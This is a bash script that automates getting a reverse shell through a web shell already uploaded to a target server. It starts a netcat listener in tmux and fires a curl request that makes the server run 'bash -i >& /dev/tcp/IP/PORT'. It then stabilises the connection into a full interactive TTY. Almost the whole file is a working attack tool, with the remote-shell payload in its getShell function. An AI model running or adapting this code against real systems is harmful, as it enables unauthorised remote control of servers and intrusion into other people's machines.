#!/bin/bash

# Colors
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"

# ctrl_c 
function ctrl_c(){
  echo -e "\n${redColour}[!]Exiting...${endColour}"
  exit 1
}

trap ctrl_c INT

function helpPanel(){
  echo -e "\n${redColour}[!] Usage: $0${endColour}"
  for i in $(seq 1 80); do echo -ne "${redColour}-"; done; echo -ne "${endColour}"
  echo -e "\n\n\t${grayColour}[-u]${endColour} ${yellowColour}Url where the web shell is uploaded${endColour}"
  echo -e "\n\t${grayColour}[-i]${endColour} ${yellowColour}Your ip address${endColour}\n"
  echo -e "\t${grayColour}[-p]${endColour} ${yellowColour}Netcat listener port${endColour}\n"
  echo -e "\t${grayColour}[-h]${endColour} ${yellowColour}Show this help panel${endColour}\n"

}

function dependencies(){ 
  echo -ne "\n${yellowColour}[+]${endColour} ${grayColour}Checking if tmux is installed...${endColour}"
  sleep 2
  test -f /usr/bin/tmux 
  if [[ "$(echo $?)" == "0" ]]; then
    echo -e " ${greenColour}[Installed]${endColour}"
  else
    echo -e " ${redColour}[!] Not installed!${endColour}"
    echo -e "${yellowColour}[+]${endColour} ${grayColour}Install tmux and run the program again${endColour}" 
    exit 1
  fi
}

function checkRoot(){
  echo -ne "\n${yellowColour}[+]${endColour} ${grayColour}Checking if u are root...${endColour}"
  sleep 2
  uid="$(id | grep -oP '(?<=uid=)[0-9]{1,}')"
  if [[ $uid == "0" ]]; then 
    echo -e "${greenColour} [YES] ${endColour}"
  else
    echo -e "${redColour}[!] You are not root! Exiting...${endColour}"
    exit 1
  fi
}

function checkPort(){
  echo -e "\n${yellowColour}[+]${endColour} ${grayColour}Checking if port $port is available...${endColour}"
  sleep 2
  check_port="$(lsof -i -P -n | grep LISTEN | awk '{print $9}' | tail -n 1)"
  if [[ $check_port == "*:$port" ]]; then
    echo -e " \n${redColour}[!] Port $port is already in use!${endColour}"
    exit 1
  fi
  
}

function getShell(){
  # Get terminal size
  rows=$(stty size | awk '{print $1}')
  columns=$(stty size | awk '{print $2}')
  # Start nc listener in a tmux session
  echo -e "\n${yellowColour}[+]${endColour}${grayColour} Setting up nc listener...${endColour}"
  tmux new-session -d -s reverse_shell
  tmux send-keys -t reverse_shell "nc -lvnp $port" Enter
  sleep 2
  # Send reverse shell
  echo -e "\n${yellowColour}[+]${endColour} ${grayColour}Sending reverse shell...${endColour}"
  sleep 2
  curl -s -o /dev/null "$url?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$ip/$port+0>%261'" &
  # Upgrade to a full interactive TTY
  echo -e "\n${yellowColour}[+]${endColour} ${grayColour}Upgrading to full interactive TTY...${endColour}"
  sleep 2
  tmux send-keys -t reverse_shell "script /dev/null -c bash" Enter
  tmux send-keys -t reverse_shell "C-z"
  tmux send-keys -t reverse_shell "stty raw -echo;fg" Enter 
  tmux send-keys -t reverse_shell "reset xterm" Enter 
  tmux send-keys -t reverse_shell "export TERM=xterm-256color" Enter 
  tmux send-keys -t reverse_shell "export SHELL=/bin/bash" Enter 
  tmux send-keys -t reverse_shell "stty rows $rows columns $columns" Enter 
  tmux send-keys -t reverse_shell "C-l"
  sleep 2
  tmux attach-session -t reverse_shell 
}

let -i parameter_counter=0 
while getopts ":u:i:p:h:" arg; do 
  case $arg in 
    u) url=$OPTARG; let parameter_counter+=1;;
    i) ip=$OPTARG; let parameter_counter+=1;;
    p) port=$OPTARG; let parameter_counter+=1;;
    h) helpPanel;;
  esac

done

if [[ parameter_counter -ne 3 ]]; then
  helpPanel 
else
  dependencies
  checkRoot
  checkPort
  getShell
fi
